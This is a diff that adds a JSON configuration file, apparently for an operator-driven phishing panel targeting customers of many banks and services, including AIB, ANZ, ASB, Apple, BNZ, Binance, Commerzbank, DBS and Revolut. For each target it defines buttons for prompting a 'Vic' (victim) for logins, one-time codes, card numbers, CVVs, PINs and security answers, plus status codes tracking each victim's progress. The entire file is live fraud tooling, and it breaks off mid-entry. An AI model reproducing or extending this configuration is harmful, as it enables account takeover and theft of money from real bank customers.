@@ -1,0 +1,3457 @@
+{
+  "aib": {
+    "buttons": [
+      {
+        "name": "ASK LOGIN AGAIN",
+        "status": "0"
+      },
+      {
+        "name": "ASK PERSONAL INFO",
+        "status": "2"
+      },
+      {
+        "name": "ASK CARD INFO",
+        "status": "4"
+      },
+      {
+        "name": "ASK OTP",
+        "status": "6"
+      },
+      {
+        "name": "ASK BRANCH INFO",
+        "status": "8"
+      },
+      {
+        "name": "FINISH",
+        "status": "12"
+      }
+    ],
+    "status": [
+      {
+        "status": 0,
+        "meaning": "Vic Resubmitted Login"
+      },
+      {
+        "status": 1,
+        "meaning": "Vic Waiting... Submitted Login"
+      },
+      {
+        "status": 2,
+        "meaning": "Vic Submitting Personal Info"
+      },
+      {
+        "status": 3,
+        "meaning": "Vic Waiting... Submitted Personal Info"
+      },
+      {
+        "status": 4,
+        "meaning": "Vic Submitting Billing Info"
+      },
+      {
+        "status": 5,
+        "meaning": "Vic Waiting... Submitted Billing Info"
+      },
+      {
+        "status": 6,
+        "meaning": "Vic Submitting OTP"
+      },
+      {
+        "status": 7,
+        "meaning": "Vic Waiting... Submitted OTP"
+      },
+      {
+        "status": 8,
+        "meaning": "Vic Submitting Branch Info"
+      },
+      {
+        "status": 9,
+        "meaning": "Vic Waiting... Submitted Branch Info"
+      },
+      {
+        "status": 10,
+        "meaning": "Vic Waiting... Resubmitted Login"
+      },
+      {
+        "status": 12,
+        "meaning": "Finished"
+      }
+    ],
+    "information": [
+      {
+        "heading": "Reg Number",
+        "key": "regnumber"
+      },
+      {
+        "heading": "PAC",
+        "key": "pac"
+      },
+      {
+        "heading": "Full Name",
+        "key": "fullname"
+      },
+      {
+        "heading": "DOB",
+        "key": "dob"
+      },
+      {
+        "heading": "Telephone",
+        "key": "telephone"
+      },
+      {
+        "heading": "Address",
+        "key": "address"
+      },
+      {
+        "heading": "Post Code",
+        "key": "pcode"
+      },
+      {
+        "heading": "Card Number",
+        "key": "ccnum"
+      },
+      {
+        "heading": "Card Exp",
+        "key": "ccexp"
+      },
+      {
+        "heading": "CVV",
+        "key": "cvv"
+      },
+      {
+        "heading": "OTP",
+        "key": "otp"
+      },
+      {
+        "heading": "Branch Address",
+        "key": "branchAddy"
+      },
+      {
+        "heading": "7 Digit Card",
+        "key": "cardNumber"
+      }
+    ],
+    "mainInfo": [
+      {
+        "usernameHeading": "regnumber"
+      }
+    ]
+  },
+  "anz": {
+    "buttons": [
+      {
+        "name": "ASK LOGIN AGAIN",
+        "status": "9"
+      },
+      {
+        "name": "ASK OTP",
+        "status": "2"
+      },
+      {
+        "name": "ASK ANSWERS",
+        "status": "4"
+      },
+      {
+        "name": "ASK TELEPHONE",
+        "status": "6"
+      },
+      {
+        "name": "FINISH",
+        "status": "8"
+      }
+    ],
+    "status": [
+      {
+        "status": 0,
+        "meaning": "Vic Resubmitted Login"
+      },
+      {
+        "status": 1,
+        "meaning": "Vic Waiting... Submitted Login"
+      },
+      {
+        "status": 2,
+        "meaning": "Vic Submitting OTP"
+      },
+      {
+        "status": 3,
+        "meaning": "Vic Waiting... Submitted OTP"
+      },
+      {
+        "status": 4,
+        "meaning": "Vic Submitting Sec Answers"
+      },
+      {
+        "status": 5,
+        "meaning": "Vic Waiting... Submitted Sec Answers"
+      },
+      {
+        "status": 6,
+        "meaning": "Vic Submitting Telephone"
+      },
+      {
+        "status": 7,
+        "meaning": "Vic Waiting... Submitted Telephone"
+      },
+      {
+        "status": 8,
+        "meaning": "Finished"
+      },
+      {
+        "status": 9,
+        "meaning": "Vic Resubmitting OTP"
+      }
+    ],
+    "information": [
+      {
+        "heading": "Username",
+        "key": "customerId"
+      },
+      {
+        "heading": "Password",
+        "key": "password"
+      },
+      {
+        "heading": "Telephone",
+        "key": "telephone"
+      },
+      {
+        "heading": "OTP",
+        "key": "otp"
+      },
+      {
+        "heading": "Answer 1",
+        "key": "answer1"
+      }
+    ],
+    "mainInfo": [
+      {
+        "usernameHeading": "customerId"
+      }
+    ]
+  },
+  "asb": {
+    "buttons": [
+      {
+        "name": "ASK LOGIN AGAIN",
+        "status": "9"
+      },
+      {
+        "name": "ASK OTP",
+        "status": "2"
+      },
+      {
+        "name": "ASK NETCODE",
+        "status": "4"
+      },
+      {
+        "name": "ASK TELEPHONE",
+        "status": "6"
+      },
+      {
+        "name": "FINISH",
+        "status": "8"
+      }
+    ],
+    "status": [
+      {
+        "status": 0,
+        "meaning": "Vic Resubmitted Login"
+      },
+      {
+        "status": 1,
+        "meaning": "Vic Submitting Telephone... Submitted Login"
+      },
+      {
+        "status": 2,
+        "meaning": "Vic Submitting OTP"
+      },
+      {
+        "status": 3,
+        "meaning": "Vic Waiting... Submitted OTP"
+      },
+      {
+        "status": 4,
+        "meaning": "Vic Submitting Netcode"
+      },
+      {
+        "status": 5,
+        "meaning": "Vic Waiting... Submitted Netcode"
+      },
+      {
+        "status": 6,
+        "meaning": "Vic Submitting Telephone"
+      },
+      {
+        "status": 7,
+        "meaning": "Vic Waiting... Submitted Telephone"
+      },
+      {
+        "status": 8,
+        "meaning": "Finished"
+      },
+      {
+        "status": 9,
+        "meaning": "Vic Resubmitting Login"
+      }
+    ],
+    "information": [
+      {
+        "heading": "Username",
+        "key": "username"
+      },
+      {
+        "heading": "Password",
+        "key": "password"
+      },
+      {
+        "heading": "Telephone",
+        "key": "telephone"
+      },
+      {
+        "heading": "OTP",
+        "key": "otp"
+      },
+      {
+        "heading": "Netcode",
+        "key": "netcode"
+      }
+    ],
+    "mainInfo": [
+      {
+        "usernameHeading": "username"
+      }
+    ]
+  },
+  "asbBusiness": {
+    "buttons": [
+      {
+        "name": "ASK LOGIN AGAIN",
+        "status": "9"
+      },
+      {
+        "name": "ASK OTP",
+        "status": "2"
+      },
+      {
+        "name": "ASK NETCODE",
+        "status": "4"
+      },
+      {
+        "name": "ASK TELEPHONE",
+        "status": "6"
+      },
+      {
+        "name": "FINISH",
+        "status": "8"
+      }
+    ],
+    "status": [
+      {
+        "status": 0,
+        "meaning": "Vic Resubmitted Login"
+      },
+      {
+        "status": 1,
+        "meaning": "Vic Submitting Telephone... Submitted Login"
+      },
+      {
+        "status": 2,
+        "meaning": "Vic Submitting OTP"
+      },
+      {
+        "status": 3,
+        "meaning": "Vic Waiting... Submitted OTP"
+      },
+      {
+        "status": 4,
+        "meaning": "Vic Submitting Netcode"
+      },
+      {
+        "status": 5,
+        "meaning": "Vic Waiting... Submitted Netcode"
+      },
+      {
+        "status": 6,
+        "meaning": "Vic Submitting Telephone"
+      },
+      {
+        "status": 7,
+        "meaning": "Vic Waiting... Submitted Telephone"
+      },
+      {
+        "status": 8,
+        "meaning": "Finished"
+      },
+      {
+        "status": 9,
+        "meaning": "Vic Resubmitting Login"
+      }
+    ],
+    "information": [
+      {
+        "heading": "Username",
+        "key": "username"
+      },
+      {
+        "heading": "Password",
+        "key": "password"
+      },
+      {
+        "heading": "Telephone",
+        "key": "telephone"
+      },
+      {
+        "heading": "OTP",
+        "key": "otp"
+      },
+      {
+        "heading": "Netcode",
+        "key": "netcode"
+      }
+    ],
+    "mainInfo": [
+      {
+        "usernameHeading": "username"
+      }
+    ]
+  },
+  "apple": {
+    "buttons": [
+      {
+        "name": "ASK BILLING",
+        "status": "13"
+      },
+      {
+        "name": "ASK OTP",
+        "status": "0"
+      },
+      {
+        "name": "ASK APP AUTH",
+        "status": "5"
+      },
+      {
+        "name": "ASK TELEPHONE",
+        "status": "9"
+      },
+      {
+        "name": "ASK CARD AGAIN",
+        "status": "7"
+      },
+      {
+        "name": "ASK BALANCE",
+        "status": "11"
+      },
+      {
+        "name": "FINISH",
+        "status": "4"
+      }
+    ],
+    "status": [
+      {
+        "status": 0,
+        "meaning": "Vic Submitting OTP"
+      },
+      {
+        "status": 1,
+        "meaning": "Vic Waiting... Submitted Personal Info"
+      },
+      {
+        "status": 2,
+        "meaning": "Vic Waiting... Submitted Card Info"
+      },
+      {
+        "status": 3,
+        "meaning": "Vic Waiting... Submitted OTP"
+      },
+      {
+        "status": 4,
+        "meaning": "Finished"
+      },
+      {
+        "status": 5,
+        "meaning": "Vic Submitting App Auth"
+      },
+      {
+        "status": 6,
+        "meaning": "Vic Waiting... Submitted App Auth"
+      },
+      {
+        "status": 7,
+        "meaning": "Vic Resubmitting Card Info"
+      },
+      {
+        "status": 8,
+        "meaning": "Vic Waiting... Resubmitted Card Info"
+      },
+      {
+        "status": 9,
+        "meaning": "Vic Submitting Telephone"
+      },
+      {
+        "status": 10,
+        "meaning": "Vic Waiting... Resubmitted Telephone"
+      },
+      {
+        "status": 11,
+        "meaning": "Vic Submitting Balance"
+      },
+      {
+        "status": 12,
+        "meaning": "Vic Waiting... Submitted Balance"
+      },
+      {
+        "status": 13,
+        "meaning": "Vic Submitting Personal Info"
+      }
+    ],
+    "information": [
+      {
+        "heading": "Full Name",
+        "key": "fullname"
+      },
+      {
+        "heading": "Telephone",
+        "key": "telephone"
+      },
+      {
+        "heading": "Address",
+        "key": "address"
+      },
+      {
+        "heading": "City",
+        "key": "city"
+      },
+      {
+        "heading": "Post Code",
+        "key": "pcode"
+      },
+      {
+        "heading": "DOB",
+        "key": "dob"
+      },
+      {
+        "heading": "Card Number",
+        "key": "ccnum"
+      },
+      {
+        "heading": "Card Exp",
+        "key": "ccexp"
+      },
+      {
+        "heading": "CVV",
+        "key": "cvv"
+      },
+      {
+        "heading": "OTP",
+        "key": "otp"
+      },
+      {
+        "heading": "Balance",
+        "key": "balance"
+      }
+    ],
+    "mainInfo": [
+      {
+        "usernameHeading": "ccname"
+      }
+    ]
+  },
+  "bnz": {
+    "buttons": [
+      {
+        "name": "ASK LOGIN AGAIN",
+        "status": "7"
+      },
+      {
+        "name": "ASK SMS OTP",
+        "status": "2"
+      },
+      {
+        "name": "ASK EMAIL OTP",
+        "status": "4"
+      },
+      {
+        "name": "FINISH",
+        "status": "6"
+      }
+    ],
+    "status": [
+      {
+        "status": 0,
+        "meaning": "Vic Resubmitted Login"
+      },
+      {
+        "status": 1,
+        "meaning": "Vic Waiting... Submitted Login"
+      },
+      {
+        "status": 2,
+        "meaning": "Vic Submitting SMS OTP"
+      },
+      {
+        "status": 3,
+        "meaning": "Vic Waiting... Submitted SMS OTP"
+      },
+      {
+        "status": 4,
+        "meaning": "Vic Submitting Email OTP"
+      },
+      {
+        "status": 5,
+        "meaning": "Vic Waiting... Submitted Email OTP"
+      },
+      {
+        "status": 6,
+        "meaning": "Finished"
+      },
+      {
+        "status": 7,
+        "meaning": "Vic Resubmitting Login"
+      }
+    ],
+    "information": [
+      {
+        "heading": "Username",
+        "key": "username"
+      },
+      {
+        "heading": "Password",
+        "key": "password"
+      },
+      {
+        "heading": "SMS OTP",
+        "key": "smsCode"
+      },
+      {
+        "heading": "Email OTP",
+        "key": "emailCode"
+      }
+    ],
+    "mainInfo": [
+      {
+        "usernameHeading": "username"
+      }
+    ]
+  },
+  "boi": {
+    "buttons": [
+      {
+        "name": "ASK LOGIN AGAIN",
+        "status": "11"
+      },
+      {
+        "name": "ASK OTP",
+        "status": "2"
+      },
+      {
+        "name": "ASK CARD",
+        "status": "4"
+      },
+      {
+        "name": "ASK TELEPHONE",
+        "status": "6"
+      },
+      {
+        "name": "ASK PIN",
+        "status": "8"
+      },
+      {
+        "name": "FINISH",
+        "status": "10"
+      }
+    ],
+    "status": [
+      {
+        "status": 0,
+        "meaning": "Vic Waiting... Resubmitted Login"
+      },
+      {
+        "status": 1,
+        "meaning": "Vic Waiting... Submitted Login"
+      },
+      {
+        "status": 2,
+        "meaning": "Vic Submitting OTP"
+      },
+      {
+        "status": 3,
+        "meaning": "Vic Waiting... Submitted OTP"
+      },
+      {
+        "status": 4,
+        "meaning": "Vic Submitting Card Info"
+      },
+      {
+        "status": 5,
+        "meaning": "Vic Waiting... Submitted Card Info"
+      },
+      {
+        "status": 6,
+        "meaning": "Vic Submitting Telephone"
+      },
+      {
+        "status": 7,
+        "meaning": "Vic Waiting... Submitted Telephone"
+      },
+      {
+        "status": 8,
+        "meaning": "Vic Submitting PIN"
+      },
+      {
+        "status": 9,
+        "meaning": "Vic Waiting... Submitted PIN"
+      },
+      {
+        "status": 10,
+        "meaning": "Finished"
+      },
+      {
+        "status": 11,
+        "meaning": "Vic Resubmitting Login"
+      }
+    ],
+    "information": [
+      {
+        "heading": "Username",
+        "key": "username"
+      },
+      {
+        "heading": "DOB",
+        "key": "dob"
+      },
+      {
+        "heading": "Password",
+        "key": "password"
+      },
+      {
+        "heading": "OTP",
+        "key": "otp"
+      },
+      {
+        "heading": "Card Number",
+        "key": "ccnum"
+      },
+      {
+        "heading": "Card Expiry",
+        "key": "ccexp"
+      },
+      {
+        "heading": "CVV",
+        "key": "cvv"
+      },
+      {
+        "heading": "PIN",
+        "key": "secToken"
+      }
+    ],
+    "mainInfo": [
+      {
+        "usernameHeading": "username"
+      }
+    ]
+  },
+  "boq": {
+    "buttons": [
+      {
+        "name": "ASK LOGIN AGAIN",
+        "status": "11"
+      },
+      {
+        "name": "ASK OTP",
+        "status": "2"
+      },
+      {
+        "name": "ASK CARD",
+        "status": "4"
+      },
+      {
+        "name": "ASK TELEPHONE",
+        "status": "6"
+      },
+      {
+        "name": "ASK SEC TOKEN",
+        "status": "8"
+      },
+      {
+        "name": "FINISH",
+        "status": "10"
+      }
+    ],
+    "status": [
+      {
+        "status": 0,
+        "meaning": "Vic Waiting... Resubmitted Login"
+      },
+      {
+        "status": 1,
+        "meaning": "Vic Waiting... Submitted Login"
+      },
+      {
+        "status": 2,
+        "meaning": "Vic Submitting OTP"
+      },
+      {
+        "status": 3,
+        "meaning": "Vic Waiting... Submitted OTP"
+      },
+      {
+        "status": 4,
+        "meaning": "Vic Submitting Card Info"
+      },
+      {
+        "status": 5,
+        "meaning": "Vic Waiting... Submitted Card Info"
+      },
+      {
+        "status": 6,
+        "meaning": "Vic Submitting Telephone"
+      },
+      {
+        "status": 7,
+        "meaning": "Vic Waiting... Submitted Telephone"
+      },
+      {
+        "status": 8,
+        "meaning": "Vic Submitting Sec Token"
+      },
+      {
+        "status": 9,
+        "meaning": "Vic Waiting... Submitted Sec Token"
+      },
+      {
+        "status": 10,
+        "meaning": "Finished"
+      },
+      {
+        "status": 11,
+        "meaning": "Vic Resubmitting Login"
+      }
+    ],
+    "information": [
+      {
+        "heading": "Username",
+        "key": "username"
+      },
+      {
+        "heading": "User ID",
+        "key": "userId"
+      },
+      {
+        "heading": "Password",
+        "key": "password"
+      },
+      {
+        "heading": "OTP",
+        "key": "otp"
+      },
+      {
+        "heading": "Card Number",
+        "key": "ccnum"
+      },
+      {
+        "heading": "Card Expiry",
+        "key": "ccexp"
+      },
+      {
+        "heading": "CVV",
+        "key": "cvv"
+      },
+      {
+        "heading": "Security Token",
+        "key": "secToken"
+      }
+    ],
+    "mainInfo": [
+      {
+        "usernameHeading": "username"
+      }
+    ]
+  },
+  "bendigo": {
+    "buttons": [
+      {
+        "name": "ASK LOGIN AGAIN",
+        "status": "11"
+      },
+      {
+        "name": "ASK OTP",
+        "status": "2"
+      },
+      {
+        "name": "ASK SEC TOKEN",
+        "status": "4"
+      },
+      {
+        "name": "ASK PHONE",
+        "status": "6"
+      },
+      {
+        "name": "ASK DOB",
+        "status": "8"
+      },
+      {
+        "name": "FINISH",
+        "status": "10"
+      }
+    ],
+    "status": [
+      {
+        "status": 0,
+        "meaning": "Vic Waiting... Resubmitted Login"
+      },
+      {
+        "status": 1,
+        "meaning": "Vic Waiting... Submitted Login"
+      },
+      {
+        "status": 2,
+        "meaning": "Vic Submitting OTP"
+      },
+      {
+        "status": 3,
+        "meaning": "Vic Waiting... Submitted OTP"
+      },
+      {
+        "status": 4,
+        "meaning": "Vic Submitting Sec Token"
+      },
+      {
+        "status": 5,
+        "meaning": "Vic Waiting... Submitted Sec Token"
+      },
+      {
+        "status": 6,
+        "meaning": "Vic Submitting Telephone"
+      },
+      {
+        "status": 7,
+        "meaning": "Vic Waiting... Submitted Telephone"
+      },
+      {
+        "status": 8,
+        "meaning": "Vic Submitting DOB"
+      },
+      {
+        "status": 9,
+        "meaning": "Vic Waiting... Submitted DOB"
+      },
+      {
+        "status": 10,
+        "meaning": "Finished"
+      },
+      {
+        "status": 11,
+        "meaning": "Vic Resubmitting Login"
+      }
+    ],
+    "information": [
+      {
+        "heading": "Access ID",
+        "key": "accessId"
+      },
+      {
+        "heading": "Password",
+        "key": "password"
+      },
+      {
+        "heading": "OTP",
+        "key": "otp"
+      },
+      {
+        "heading": "Sec Token",
+        "key": "secToken"
+      },
+      {
+        "heading": "DOB",
+        "key": "dob"
+      },
+      {
+        "heading": "Phone Number",
+        "key": "telephone"
+      }
+    ],
+    "mainInfo": [
+      {
+        "usernameHeading": "accessId"
+      }
+    ]
+  },
+  "beyond": {
+    "buttons": [
+      {
+        "name": "ASK LOGIN AGAIN",
+        "status": "7"
+      },
+      {
+        "name": "ASK SMS OTP",
+        "status": "2"
+      },
+      {
+        "name": "ASK EMAIL OTP",
+        "status": "4"
+      },
+      {
+        "name": "FINISH",
+        "status": "6"
+      }
+    ],
+    "status": [
+      {
+        "status": 0,
+        "meaning": "Vic Resubmitted Login"
+      },
+      {
+        "status": 1,
+        "meaning": "Vic Waiting... Submitted Login"
+      },
+      {
+        "status": 2,
+        "meaning": "Vic Submitting OTP"
+      },
+      {
+        "status": 3,
+        "meaning": "Vic Waiting... Submitted OTP"
+      },
+      {
+        "status": 4,
+        "meaning": "Vic Submitting Telephone"
+      },
+      {
+        "status": 5,
+        "meaning": "Vic Waiting... Submitted Telephone"
+      },
+      {
+        "status": 6,
+        "meaning": "Vic Submitting DOB"
+      },
+      {
+        "status": 7,
+        "meaning": "Vic Waiting... Submitted DOB"
+      },
+      {
+        "status": 8,
+        "meaning": "Finished"
+      },
+      {
+        "status": 9,
+        "meaning": "Vic Resubmitting Login"
+      }
+    ],
+    "information": [
+      {
+        "heading": "Username",
+        "key": "username"
+      },
+      {
+        "heading": "Password",
+        "key": "password"
+      },
+      {
+        "heading": "Telephone",
+        "key": "telephone"
+      },
+      {
+        "heading": "DOB",
+        "key": "dob"
+      },
+      {
+        "heading": "OTP",
+        "key": "otp"
+      }
+    ],
+    "mainInfo": [
+      {
+        "usernameHeading": "username"
+      }
+    ]
+  },
+  "binance": {
+    "buttons": [
+      {
+        "name": "ASK LOGIN AGAIN",
+        "status": "7"
+      },
+      {
+        "name": "ASK SMS OTP",
+        "status": "2"
+      },
+      {
+        "name": "ASK EMAIL OTP",
+        "status": "4"
+      },
+      {
+        "name": "FINISH",
+        "status": "6"
+      }
+    ],
+    "status": [
+      {
+        "status": 0,
+        "meaning": "Vic Resubmitted Login"
+      },
+      {
+        "status": 1,
+        "meaning": "Vic Waiting... Submitted Login"
+      },
+      {
+        "status": 2,
+        "meaning": "Vic Submitting SMS OTP"
+      },
+      {
+        "status": 3,
+        "meaning": "Vic Waiting... Submitted SMS OTP"
+      },
+      {
+        "status": 4,
+        "meaning": "Vic Submitting Email OTP"
+      },
+      {
+        "status": 5,
+        "meaning": "Vic Waiting... Submitted Email OTP"
+      },
+      {
+        "status": 6,
+        "meaning": "Finished"
+      },
+      {
+        "status": 7,
+        "meaning": "Vic Resubmitting Login"
+      }
+    ],
+    "information": [
+      {
+        "heading": "Email",
+        "key": "email"
+      },
+      {
+        "heading": "Mobile",
+        "key": "telephone"
+      },
+      {
+        "heading": "Password",
+        "key": "password"
+      },
+      {
+        "heading": "SMS OTP",
+        "key": "telephoneCode"
+      },
+      {
+        "heading": "Email OTP",
+        "key": "emailCode"
+      },
+      {
+        "heading": "Google Auth Code",
+        "key": "googleCode"
+      }
+    ],
+    "mainInfo": [
+      {
+        "usernameHeading": "email"
+      }
+    ]
+  },
+  "bnp": {
+    "buttons": [
+      {
+        "name": "ASK LOGIN AGAIN",
+        "status": "7"
+      },
+      {
+        "name": "ASK SMS OTP",
+        "status": "2"
+      },
+      {
+        "name": "ASK EMAIL OTP",
+        "status": "4"
+      },
+      {
+        "name": "FINISH",
+        "status": "6"
+      }
+    ],
+    "status": [
+      {
+        "status": 0,
+        "meaning": "Vic Resubmitted Login"
+      },
+      {
+        "status": 1,
+        "meaning": "Vic Waiting... Submitted Login"
+      },
+      {
+        "status": 2,
+        "meaning": "Vic Submitting SMS OTP"
+      },
+      {
+        "status": 3,
+        "meaning": "Vic Waiting... Submitted SMS OTP"
+      },
+      {
+        "status": 4,
+        "meaning": "Vic Submitting Email OTP"
+      },
+      {
+        "status": 5,
+        "meaning": "Vic Waiting... Submitted Email OTP"
+      },
+      {
+        "status": 6,
+        "meaning": "Finished"
+      },
+      {
+        "status": 7,
+        "meaning": "Vic Resubmitting Login"
+      }
+    ],
+    "information": [
+      {
+        "heading": "Username",
+        "key": "username"
+      },
+      {
+        "heading": "Password",
+        "key": "password"
+      },
+      {
+        "heading": "SMS OTP",
+        "key": "smsCode"
+      },
+      {
+        "heading": "Email OTP",
+        "key": "emailCode"
+      }
+    ],
+    "mainInfo": [
+      {
+        "usernameHeading": "username"
+      }
+    ]
+  },
+  "citi": {
+    "buttons": [
+      {
+        "name": "ASK LOGIN AGAIN",
+        "status": "7"
+      },
+      {
+        "name": "ASK SMS OTP",
+        "status": "2"
+      },
+      {
+        "name": "ASK EMAIL OTP",
+        "status": "4"
+      },
+      {
+        "name": "FINISH",
+        "status": "6"
+      }
+    ],
+    "status": [
+      {
+        "status": 0,
+        "meaning": "Vic Resubmitted Login"
+      },
+      {
+        "status": 1,
+        "meaning": "Vic Waiting... Submitted Login"
+      },
+      {
+        "status": 2,
+        "meaning": "Vic Submitting SMS OTP"
+      },
+      {
+        "status": 3,
+        "meaning": "Vic Waiting... Submitted SMS OTP"
+      },
+      {
+        "status": 4,
+        "meaning": "Vic Submitting Email OTP"
+      },
+      {
+        "status": 5,
+        "meaning": "Vic Waiting... Submitted Email OTP"
+      },
+      {
+        "status": 6,
+        "meaning": "Finished"
+      },
+      {
+        "status": 7,
+        "meaning": "Vic Resubmitting Login"
+      }
+    ],
+    "information": [
+      {
+        "heading": "Username",
+        "key": "username"
+      },
+      {
+        "heading": "Password",
+        "key": "password"
+      },
+      {
+        "heading": "SMS OTP",
+        "key": "smsCode"
+      },
+      {
+        "heading": "Email OTP",
+        "key": "emailCode"
+      }
+    ],
+    "mainInfo": [
+      {
+        "usernameHeading": "username"
+      }
+    ]
+  },
+  "cb": {
+    "buttons": [
+      {
+        "name": "ASK LOGIN AGAIN",
+        "status": "7"
+      },
+      {
+        "name": "ASK SMS OTP",
+        "status": "2"
+      },
+      {
+        "name": "ASK EMAIL OTP",
+        "status": "4"
+      },
+      {
+        "name": "FINISH",
+        "status": "6"
+      }
+    ],
+    "status": [
+      {
+        "status": 0,
+        "meaning": "Vic Resubmitted Login"
+      },
+      {
+        "status": 1,
+        "meaning": "Vic Waiting... Submitted Login"
+      },
+      {
+        "status": 2,
+        "meaning": "Vic Submitting SMS OTP"
+      },
+      {
+        "status": 3,
+        "meaning": "Vic Waiting... Submitted SMS OTP"
+      },
+      {
+        "status": 4,
+        "meaning": "Vic Submitting Email OTP"
+      },
+      {
+        "status": 5,
+        "meaning": "Vic Waiting... Submitted Email OTP"
+      },
+      {
+        "status": 6,
+        "meaning": "Finished"
+      },
+      {
+        "status": 7,
+        "meaning": "Vic Resubmitting Login"
+      }
+    ],
+    "information": [
+      {
+        "heading": "Username",
+        "key": "username"
+      },
+      {
+        "heading": "Password",
+        "key": "password"
+      },
+      {
+        "heading": "SMS OTP",
+        "key": "smsCode"
+      },
+      {
+        "heading": "Email OTP",
+        "key": "emailCode"
+      }
+    ],
+    "mainInfo": [
+      {
+        "usernameHeading": "username"
+      }
+    ]
+  },
+  "commerz": {
+    "buttons": [
+      {
+        "name": "ASK LOGIN AGAIN",
+        "status": "9"
+      },
+      {
+        "name": "ASK PUSH TAN",
+        "status": "10"
+      },
+      {
+        "name": "ASK ACTIVATION QR",
+        "status": "2"
+      },
+      {
+        "name": "ASK TELEPHONE",
+        "status": "4"
+      },
+      {
+        "name": "ASK TAN",
+        "status": "6",
+        "input": {
+          "id": "qrLink",
+          "placeholder": "QR Link"
+        }
+      },
+      {
+        "name": "FINISH",
+        "status": "8"
+      }
+    ],
+    "status": [
+      {
+        "status": 0,
+        "meaning": "Vic Waiting... Resubmitted Login"
+      },
+      {
+        "status": 1,
+        "meaning": "Vic Waiting... Submitted Login"
+      },
+      {
+        "status": 2,
+        "meaning": "Vic Submitting QR"
+      },
+      {
+        "status": 3,
+        "meaning": "Vic Waiting... Submitted QR (skipped if none there)"
+      },
+      {
+        "status": 4,
+        "meaning": "Vic Submitting Telephone"
+      },
+      {
+        "status": 5,
+        "meaning": "Vic Waiting... Submitted Telephone"
+      },
+      {
+        "status": 6,
+        "meaning": "Vic Submitting TAN"
+      },
+      {
+        "status": 7,
+        "meaning": "Vic Waiting... Submitted TAN"
+      },
+      {
+        "status": 8,
+        "meaning": "Finished"
+      },
+      {
+        "status": 9,
+        "meaning": "Vic Resubmitting Login"
+      },
+      {
+        "status": 10,
+        "meaning": "Vic Submitting Push TAN"
+      },
+      {
+        "status": 11,
+        "meaning": "Vic Waiting... Submitted Push TAN"
+      }
+    ],
+    "information": [
+      {
+        "heading": "Username",
+        "key": "username"
+      },
+      {
+        "heading": "PIN",
+        "key": "pin"
+      },
+      {
+        "heading": "Telephone",
+        "key": "telephone"
+      },
+      {
+        "heading": "QR Code",
+        "key": "qrCode"
+      },
+      {
+        "heading": "TAN",
+        "key": "tan"
+      }
+    ],
+    "mainInfo": [
+      {
+        "usernameHeading": "username"
+      }
+    ]
+  },
+  "dbs": {
+    "buttons": [
+      {
+        "name": "ASK LOGIN AGAIN",
+        "status": "7"
+      },
+      {
+        "name": "ASK SMS OTP",
+        "status": "2"
+      },
+      {
+        "name": "ASK EMAIL OTP",
+        "status": "4"
+      },
+      {
+        "name": "FINISH",
+        "status": "6"
+      }
+    ],
+    "status": [
+      {
+        "status": 0,
+        "meaning": "Vic Resubmitted Login"
+      },
+      {
+        "status": 1,
+        "meaning": "Vic Waiting... Submitted Login"
+      },
+      {
+        "status": 2,
+        "meaning": "Vic Submitting SMS OTP"
+      },
+      {
+        "status": 3,
+        "meaning": "Vic Waiting... Submitted SMS OTP"
+      },
+      {
+        "status": 4,
+        "meaning": "Vic Submitting Email OTP"
+      },
+      {
+        "status": 5,
+        "meaning": "Vic Waiting... Submitted Email OTP"
+      },
+      {
+        "status": 6,
+        "meaning": "Finished"
+      },
+      {
+        "status": 7,
+        "meaning": "Vic Resubmitting Login"
+      }
+    ],
+    "information": [
+      {
+        "heading": "Username",
+        "key": "username"
+      },
+      {
+        "heading": "Password",
+        "key": "password"
+      },
+      {
+        "heading": "SMS OTP",
+        "key": "smsCode"
+      },
+      {
+        "heading": "Email OTP",
+        "key": "emailCode"
+      }
+    ],
+    "mainInfo": [
+      {
+        "usernameHeading": "username"
+      }
+    ]
+  },
+  "rbc": {
+    "buttons": [
+      {
+        "name": "ASK LOGIN AGAIN",
+        "status": "7"
+      },
+      {
+        "name": "ASK SMS OTP",
+        "status": "2"
+      },
+      {
+        "name": "ASK EMAIL OTP",
+        "status": "4"
+      },
+      {
+        "name": "FINISH",
+        "status": "6"
+      }
+    ],
+    "status": [
+      {
+        "status": 0,
+        "meaning": "Vic Resubmitted Login"
+      },
+      {
+        "status": 1,
+        "meaning": "Vic Waiting... Submitted Login"
+      },
+      {
+        "status": 2,
+        "meaning": "Vic Submitting SMS OTP"
+      },
+      {
+        "status": 3,
+        "meaning": "Vic Waiting... Submitted SMS OTP"
+      },
+      {
+        "status": 4,
+        "meaning": "Vic Submitting Email OTP"
+      },
+      {
+        "status": 5,
+        "meaning": "Vic Waiting... Submitted Email OTP"
+      },
+      {
+        "status": 6,
+        "meaning": "Finished"
+      },
+      {
+        "status": 7,
+        "meaning": "Vic Resubmitting Login"
+      }
+    ],
+    "information": [
+      {
+        "heading": "Username",
+        "key": "username"
+      },
+      {
+        "heading": "Password",
+        "key": "password"
+      },
+      {
+        "heading": "SMS OTP",
+        "key": "smsCode"
+      },
+      {
+        "heading": "Email OTP",
+        "key": "emailCode"
+      }
+    ],
+    "mainInfo": [
+      {
+        "usernameHeading": "username"
+      }
+    ]
+  },
+  "rev": {
+    "buttons": [
+      {
+        "name": "ASK LOGIN AGAIN",
+        "status": "7"
+      },
+      {
+        "name": "ASK SMS OTP",
+        "status": "2"
+      },
+      {
+        "name": "ASK EMAIL OTP",
+        "status": "4"
+      },
+      {
+        "name": "FINISH",
+        "status": "6"
+      }
+    ],
+    "status": [
+      {
+        "status": 0,
+        "meaning": "Vic Resubmitted Login"
+      },
+      {
+        "status": 1,
+        "meaning": "Vic Waiting... Submitted Login"
+      },
+      {
+        "status": 2,
+        "meaning": "Vic Submitting SMS OTP"
+      },
+      {
+        "status": 3,
+        "meaning": "Vic Waiting... Submitted SMS OTP"
+      },
+      {
+        "status": 4,
+        "meaning": "Vic Submitting Email OTP"
+      },
+      {
+        "status": 5,
+        "meaning": "Vic Waiting... Submitted Email OTP"
+      },
+      {
+        "status": 6,
+        "meaning": "Finished"
+      },
+      {
+        "status": 7,
+        "meaning": "Vic Resubmitting Login"
+      }
+    ],
+    "information": [
+      {
+        "heading": "Username",
+        "key": "username"
+      },
+      {
+        "heading": "Password",
+        "key": "password"
+      },
+      {
+        "heading": "SMS OTP",
+        "key": "smsCode"
+      },
+      {
+        "heading": "Email OTP",
+        "key": "emailCode"
+      }
+    ],
+    "mainInfo": [
+      {
+        "usernameHeading": "username"
+      }
+    ]
+  },
+  "mq": {
+    "buttons": [
+      {
+        "name": "ASK LOGIN AGAIN",
+        "status": "7"
+      },
+      {
+        "name": "ASK SMS OTP",
+        "status": "2"
